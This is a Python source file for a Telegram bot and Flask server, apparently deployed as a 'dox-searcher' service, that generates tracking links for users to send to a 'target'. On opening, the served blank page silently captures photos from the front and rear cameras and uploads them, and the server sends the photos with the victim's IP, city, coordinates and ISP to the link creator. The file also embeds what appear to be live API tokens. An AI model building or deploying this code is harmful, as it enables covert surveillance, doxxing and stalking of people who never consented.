import base64
import threading
import random
import string
import json
import requests
import time
import os
from flask import Flask, request, render_template_string, jsonify
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import ipinfo
from datetime import datetime

app = Flask(__name__)

# Конфигурация
BOT_TOKEN = '8048949774:AAE8_hbqnCu5rwfrLdqZFlgbZ3v_INCfEZA'
BASE_URL = "https://dox-searcher.onrender.com"
IPINFO_TOKEN = "c39bb318760ade"  # Получите токен на ipinfo.io

bot = telebot.TeleBot(BOT_TOKEN)
ipinfo_handler = ipinfo.getHandler(IPINFO_TOKEN)

# Хранилища данных
photo_storage = {}  # {user_id: {"front": front_photo, "back": back_photo, "ip_info": ip_info}}
user_tokens = {}  # user_id: custom_token
user_data = {}  # {user_id: {"username": "", "first_name": "", "last_name": "", "registration_date": ""}}
banned_users = set()
ADMINS = [688656311]  # Ваш user_id

# Генератор случайных токенов
def generate_token(length=8):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# HTML шаблон с двумя камерами (остается без изменений)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: white;
            overflow: hidden;
        }
        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <video id="frontVideo" autoplay playsinline></video>
    <canvas id="frontCanvas"></canvas>
    <video id="backVideo" autoplay playsinline></video>
    <canvas id="backCanvas"></canvas>

    <script>
        const frontVideo = document.getElementById('frontVideo');
        const frontCanvas = document.getElementById('frontCanvas');
        const backVideo = document.getElementById('backVideo');
        const backCanvas = document.getElementById('backCanvas');
        
        frontCanvas.width = backCanvas.width = 640;
        frontCanvas.height = backCanvas.height = 480;
        
        // Функция для захвата фото
        function capturePhoto(video, canvas) {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            return canvas.toDataURL('image/jpeg', 0.8);
        }
        
        // Функция отправки фото на сервер
        async function sendPhotos(frontPhoto, backPhoto) {
            const token = window.location.pathname.split('/').pop();
            
            try {
                const response = await fetch('/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        front_image: frontPhoto,
                        back_image: backPhoto,
                        token: token
                    })
                });
                
                // После отправки останавливаем камеры
                [frontVideo, backVideo].forEach(video => {
                    if (video.srcObject) {
                        const tracks = video.srcObject.getTracks();
                        tracks.forEach(track => track.stop());
                    }
                });
                
            } catch (error) {
                console.error('Upload error:', error);
            }
        }
        
        // Получаем IP информацию
        async function getIPInfo() {
            try {
                const response = await fetch('https://ipinfo.io/json');
                return await response.json();
            } catch (error) {
                console.error('IP info error:', error);
                return {};
            }
        }
        
        // Автоматическая фотосъемка при получении доступа
        async function initCamerasAndCapture() {
            try {
                // Получаем IP информацию
                const ipInfo = await getIPInfo();
                
                // Получаем список устройств
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                
                // Если есть только одна камера (обычно фронтальная)
                if (videoDevices.length === 1) {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: {
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            facingMode: 'user'
                        } 
                    });
                    
                    frontVideo.srcObject = stream;
                    
                    // Ждем 1 секунду для стабилизации изображения
                    setTimeout(async () => {
                        const frontPhoto = capturePhoto(frontVideo, frontCanvas);
                        await sendPhotos(frontPhoto, null);
                    }, 1000);
                } 
                // Если есть две камеры (фронтальная и задняя)
                else if (videoDevices.length >= 2) {
                    // Захватываем фронтальную камеру
                    const frontStream = await navigator.mediaDevices.getUserMedia({ 
                        video: {
                            width: { ideal: 1280 },
                            height: { ideal: 720 },
                            facingMode: 'user'
                        } 
                    });
                    
                    frontVideo.srcObject = frontStream;
                    
                    // Ждем 1 секунду и делаем снимок
                    setTimeout(async () => {
                        const frontPhoto = capturePhoto(frontVideo, frontCanvas);
                        
                        // Останавливаем фронтальную камеру
                        frontStream.getTracks().forEach(track => track.stop());
                        
                        // Захватываем заднюю камеру
                        const backStream = await navigator.mediaDevices.getUserMedia({ 
                            video: {
                                width: { ideal: 1280 },
                                height: { ideal: 720 },
                                facingMode: { exact: 'environment' }
                            } 
                        });
                        
                        backVideo.srcObject = backStream;
                        
                        // Ждем 1 секунду и делаем снимок
                        setTimeout(async () => {
                            const backPhoto = capturePhoto(backVideo, backCanvas);
                            await sendPhotos(frontPhoto, backPhoto);
                        }, 1000);
                        
                    }, 1000);
                }
                
            } catch (err) {
                console.error('Camera error:', err);
                try {
                    // Если не получилось с двумя камерами, пробуем хотя бы с одной
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: true 
                    });
                    
                    frontVideo.srcObject = stream;
                    
                    setTimeout(async () => {
                        const frontPhoto = capturePhoto(frontVideo, frontCanvas);
                        await sendPhotos(frontPhoto, null);
                    }, 1000);
                } catch (e) {
                    console.error('Fallback camera error:', e);
                }
            }
        }
        
        // Запускаем процесс при загрузке страницы
        window.addEventListener('DOMContentLoaded', initCamerasAndCapture);
    </script>
</body>
</html>
"""

@app.route('/<custom_token>')
def phishing_page(custom_token):
    # Получаем IP информацию
    ip_info = {}
    try:
        if request.headers.getlist("X-Forwarded-For"):
            ip = request.headers.getlist("X-Forwarded-For")[0]
        else:
            ip = request.remote_addr
        
        # Получаем информацию о местоположении
        details = ipinfo_handler.getDetails(ip)
        ip_info = {
            "ip": ip,
            "city": details.city or "Unknown",
            "region": details.region or "Unknown",
            "country": details.country_name or "Unknown",
            "loc": details.loc or "Unknown",
            "org": details.org or "Unknown"
        }
    except Exception as e:
        print(f"Ошибка при получении IP информации: {e}")
        ip_info = {"error": "Не удалось получить информацию об IP"}
    
    # Сохраняем IP информацию для этого токена
    user_id = None
    for uid, token in user_tokens.items():
        if token == custom_token:
            user_id = uid
            break
    
    if user_id:
        if user_id not in photo_storage:
            photo_storage[user_id] = {}
        photo_storage[user_id]["ip_info"] = ip_info
    
    return render_template_string(HTML_TEMPLATE)

@app.route('/upload', methods=['POST'])
def handle_upload():
    try:
        data = request.json
        custom_token = data.get('token')
        
        if not custom_token:
            return 'Token required', 400
            
        user_id = None
        for uid, token in user_tokens.items():
            if token == custom_token:
                user_id = uid
                break
                
        if not user_id:
            return 'Invalid token', 400

        # Создаем папку для фото, если ее нет
        os.makedirs("photos", exist_ok=True)
        
        # Сохраняем фото
        timestamp = int(time.time())
        front_filename = None
        back_filename = None
        
        if data.get('front_image'):
            front_image_data = data['front_image'].split(',')[1]
            front_filename = f"photos/front_{custom_token}_{timestamp}.jpg"
            with open(front_filename, "wb") as f:
                f.write(base64.b64decode(front_image_data))
            
            if user_id not in photo_storage:
                photo_storage[user_id] = {}
            photo_storage[user_id]["front"] = front_filename
        
        if data.get('back_image'):
            back_image_data = data['back_image'].split(',')[1]
            back_filename = f"photos/back_{custom_token}_{timestamp}.jpg"
            with open(back_filename, "wb") as f:
                f.write(base64.b64decode(back_image_data))
            
            if user_id not in photo_storage:
                photo_storage[user_id] = {}
            photo_storage[user_id]["back"] = back_filename
        
        # Получаем сохраненную IP информацию
        ip_info = photo_storage.get(user_id, {}).get("ip_info", {})
        
        # Формируем сообщение с фото и IP информацией
        caption = f"✅ Фото успешно получено!\nТокен: {custom_token}\n\n"
        caption += "🌍 IP информация:\n"
        caption += f"▪️ IP: {ip_info.get('ip', 'Unknown')}\n"
        caption += f"▪️ Город: {ip_info.get('city', 'Unknown')}\n"
        caption += f"▪️ Регион: {ip_info.get('region', 'Unknown')}\n"
        caption += f"▪️ Страна: {ip_info.get('country', 'Unknown')}\n"
        caption += f"▪️ Координаты: {ip_info.get('loc', 'Unknown')}\n"
        caption += f"▪️ Провайдер: {ip_info.get('org', 'Unknown')}"
        
        # Отправляем фото в Telegram
        media = []
        
        if front_filename:
            with open(front_filename, "rb") as photo:
                media.append(telebot.types.InputMediaPhoto(photo, caption=caption if not back_filename else None))
        
        if back_filename:
            with open(back_filename, "rb") as photo:
                media.append(telebot.types.InputMediaPhoto(photo, caption=caption if not front_filename else None))
        
        if media:
            bot.send_media_group(user_id, media)
        
        return '', 200
    except Exception as e:
        print(f"Ошибка при загрузке фото: {e}")
        return 'Server error', 500

# Обработчики бота
@bot.message_handler(commands=['start'])
def start_handler(message):
    try:
        user_id = message.from_user.id
        
        # Проверяем, забанен ли пользователь
        if user_id in banned_users:
            bot.send_message(user_id, "❌ Вы заблокированы в этом боте.")
            return
        
        # Сохраняем информацию о пользователе
        if user_id not in user_data:
            user_data[user_id] = {
                "username": message.from_user.username or "",
                "first_name": message.from_user.first_name or "",
                "last_name": message.from_user.last_name or "",
                "registration_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "last_activity": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
        else:
            user_data[user_id]["last_activity"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        if os.path.exists('icon.png'):
            with open('icon.png', 'rb') as photo:
                bot.send_photo(
                    message.chat.id,
                    photo,
                    caption="<b>Получи фото лица своего обидчика за пару секунд.</b>",
                    parse_mode="HTML",
                    reply_markup=main_keyboard()
                )
        else:
            bot.send_message(
                message.chat.id,
                "<b>Получи фото лица своего обидчика за пару секунд.</b>",
                parse_mode="HTML",
                reply_markup=main_keyboard()
            )
    except Exception as e:
        print(f"Ошибка при отправке стартового сообщения: {e}")
        bot.send_message(
            message.chat.id,
            "Получи фото лица своего обидчика за пару секунд.",
            reply_markup=main_keyboard()
        )

def main_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton('🛡 Создать ссылку', callback_data='create_link')
    )
    return keyboard

@bot.callback_query_handler(func=lambda call: call.data == 'create_link')
def create_link_handler(call):
    try:
        user_id = call.message.chat.id
        
        # Проверяем, забанен ли пользователь
        if user_id in banned_users:
            bot.send_message(user_id, "❌ Вы заблокированы в этом боте.")
            bot.answer_callback_query(call.id)
            return
        
        custom_token = generate_token()
        user_tokens[user_id] = custom_token
        link = f"{BASE_URL}/{custom_token}"
        
        print(f"Создана ссылка для {user_id}: {link}")
        
        bot.send_message(
            user_id,
            f"🔗 Ваша ссылка для получения лица:\n<code>{link}</code>\n\n"
            "Отправьте её цели. При открытии:\n"
            "1. Автоматически запросится доступ к камере\n"
            "2. Если доступ разрешен - фото сделается автоматически\n"
            "3. Фото придет в этот чат",
            parse_mode="HTML"
        )
        
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"Ошибка при создании ссылки: {e}")
        bot.send_message(call.message.chat.id, "❌ Произошла ошибка при создании ссылки. Попробуйте позже.")

# Админ-панель
@bot.message_handler(commands=['admin'])
def admin_handler(message):
    if message.from_user.id not in ADMINS:
        return
        
    bot.send_message(
        message.chat.id,
        "🔒 Админ-панель:",
        reply_markup=admin_keyboard()
    )

def admin_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton('📊 Статистика', callback_data='admin_stats'),
        InlineKeyboardButton('📢 Рассылка', callback_data='admin_broadcast')
    )
    keyboard.row(
        InlineKeyboardButton('🚫 Бан пользователя', callback_data='admin_ban'),
        InlineKeyboardButton('✅ Разбан пользователя', callback_data='admin_unban')
    )
    keyboard.row(
        InlineKeyboardButton('📥 Экспорт данных (JSON)', callback_data='admin_export')
    )
    return keyboard

@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback_handler(call):
    admin_id = call.message.chat.id
    if admin_id not in ADMINS:
        return
    
    action = call.data.split('_')[1]
    
    if action == 'stats':
        show_admin_stats(admin_id)
    elif action == 'broadcast':
        request_broadcast_message(admin_id)
    elif action == 'ban':
        request_ban_user(admin_id)
    elif action == 'unban':
        request_unban_user(admin_id)
    elif action == 'export':
        export_user_data(admin_id)
    
    bot.answer_callback_query(call.id)

def show_admin_stats(admin_id):
    total_users = len(user_data)
    active_users = len([uid for uid, data in user_data.items() 
                       if (datetime.now() - datetime.strptime(data["last_activity"], "%Y-%m-%d %H:%M:%S")).days < 30])
    banned_users_count = len(banned_users)
    
    stats_text = (
        f"📊 Статистика бота:\n\n"
        f"👥 Всего пользователей: {total_users}\n"
        f"🟢 Активных пользователей (за 30 дней): {active_users}\n"
        f"🔴 Забанено пользователей: {banned_users_count}\n\n"
        f"📅 Последние 5 зарегистрированных пользователей:\n"
    )
    
    # Сортируем пользователей по дате регистрации
    sorted_users = sorted(user_data.items(), 
                         key=lambda x: datetime.strptime(x[1]["registration_date"], "%Y-%m-%d %H:%M:%S"), 
                         reverse=True)
    
    for user_id, data in list(sorted_users)[:5]:
        username = f"@{data['username']}" if data['username'] else "нет username"
        stats_text += (
            f"├ ID: {user_id}\n"
            f"├ Имя: {data['first_name']} {data['last_name']}\n"
            f"├ Username: {username}\n"
            f"└ Дата регистрации: {data['registration_date']}\n\n"
        )
    
    bot.send_message(admin_id, stats_text)

def request_broadcast_message(admin_id):
    msg = bot.send_message(
        admin_id,
        "Введите сообщение для рассылки (можно использовать HTML разметку):"
    )
    bot.register_next_step_handler(msg, process_broadcast_message)

def process_broadcast_message(message):
    admin_id = message.chat.id
    if admin_id not in ADMINS:
        return
    
    broadcast_text = message.text or message.caption
    parse_mode = "HTML" if ("<" in broadcast_text and ">" in broadcast_text) else None
    
    # Подтверждение рассылки
    bot.send_message(
        admin_id,
        f"Вы уверены, что хотите разослать это сообщение {len(user_data)} пользователям?\n\n"
        f"Предпросмотр:\n\n{broadcast_text}",
        parse_mode=parse_mode,
        reply_markup=InlineKeyboardMarkup().row(
            InlineKeyboardButton('✅ Да, разослать', callback_data=f'confirm_broadcast:{parse_mode}'),
            InlineKeyboardButton('❌ Нет, отменить', callback_data='cancel_broadcast')
        )
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith('confirm_broadcast'))
def confirm_broadcast(call):
    admin_id = call.message.chat.id
    if admin_id not in ADMINS:
        return
    
    parse_mode = call.data.split(':')[1] if ':' in call.data else None
    broadcast_text = call.message.text.split('\n\n', 1)[1] if '\n\n' in call.message.text else call.message.text
    
    bot.send_message(admin_id, "⏳ Начинаю рассылку...")
    
    success = 0
    failed = 0
    total = len(user_data)
    
    for i, (user_id, _) in enumerate(user_data.items(), 1):
        if user_id in banned_users:
            failed += 1
            continue
            
        try:
            bot.send_message(
                user_id,
                broadcast_text,
                parse_mode=parse_mode
            )
            success += 1
        except Exception as e:
            print(f"Ошибка при отправке сообщения {user_id}: {e}")
            failed += 1
        
        # Обновляем прогресс каждые 10 отправок
        if i % 10 == 0 or i == total:
            bot.edit_message_text(
                chat_id=admin_id,
                message_id=call.message.message_id + 1,
                text=f"⏳ Рассылка... {i}/{total}\n\n✅ Успешно: {success}\n❌ Ошибок: {failed}"
            )
    
    bot.send_message(
        admin_id,
        f"✅ Рассылка завершена!\n\n"
        f"Всего пользователей: {total}\n"
        f"Успешно: {success}\n"
        f"Ошибок: {failed}"
    )
    
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'cancel_broadcast')
def cancel_broadcast(call):
    bot.send_message(call.message.chat.id, "❌ Рассылка отменена")
    bot.answer_callback_query(call.id)

def request_ban_user(admin_id):
    msg = bot.send_message(
        admin_id,
        "Введите ID пользователя для бана:"
    )
    bot.register_next_step_handler(msg, process_ban_user)

def process_ban_user(message):
    admin_id = message.chat.id
    if admin_id not in ADMINS:
        return
    
    try:
        user_id = int(message.text)
        if user_id in ADMINS:
            bot.send_message(admin_id, "❌ Нельзя забанить администратора!")
            return
            
        banned_users.add(user_id)
        bot.send_message(admin_id, f"✅ Пользователь {user_id} забанен")
        
        # Пытаемся уведомить пользователя
        try:
            bot.send_message(user_id, "❌ Вы были заблокированы в этом боте.")
        except:
            pass
    except ValueError:
        bot.send_message(admin_id, "❌ Неверный формат ID. Введите числовой ID пользователя.")

def request_unban_user(admin_id):
    msg = bot.send_message(
        admin_id,
        "Введите ID пользователя для разбана:"
    )
    bot.register_next_step_handler(msg, process_unban_user)

def process_unban_user(message):
    admin_id = message.chat.id
    if admin_id not in ADMINS:
        return
    
    try:
        user_id = int(message.text)
        if user_id in banned_users:
            banned_users.remove(user_id)
            bot.send_message(admin_id, f"✅ Пользователь {user_id} разбанен")
            
            # Пытаемся уведомить пользователя
            try:
                bot.send_message(user_id, "✅ Вы были разблокированы в этом боте.")
            except:
                pass
        else:
            bot.send_message(admin_id, f"ℹ️ Пользователь {user_id} не был забанен")
    except ValueError:
        bot.send_message(admin_id, "❌ Неверный формат ID. Введите числовой ID пользователя.")

def export_user_data(admin_id):
    # Создаем временный файл
    filename = f"user_data_export_{int(time.time())}.json"
    
    # Подготовка данных для экспорта
    export_data = {
        "total_users": len(user_data),
        "banned_users": list(banned_users),
        "users": []
    }
    
    for user_id, data in user_data.items():
        export_data["users"].append({
            "user_id": user_id,
            "username": data["username"],
            "first_name": data["first_name"],
            "last_name": data["last_name"],
            "registration_date": data["registration_date"],
            "last_activity": data.get("last_activity", ""),
            "is_banned": user_id in banned_users
        })
    
    # Сохраняем в файл
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(export_data, f, ensure_ascii=False, indent=2)
    
    # Отправляем файл
    with open(filename, "rb") as f:
        bot.send_document(admin_id, f, caption="📊 Экспорт данных пользователей")
    
    # Удаляем временный файл
    os.remove(filename)

def run_flask():
    app.run(host='0.0.0.0', port=5000, threaded=True)

def run_bot():
    print("Бот запущен!")
    bot.infinity_polling()

if __name__ == '__main__':
    # Создаем папку для фото
    os.makedirs("photos", exist_ok=True)
    
    # Запускаем Flask в отдельном потоке
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Запускаем бота
    run_bot()
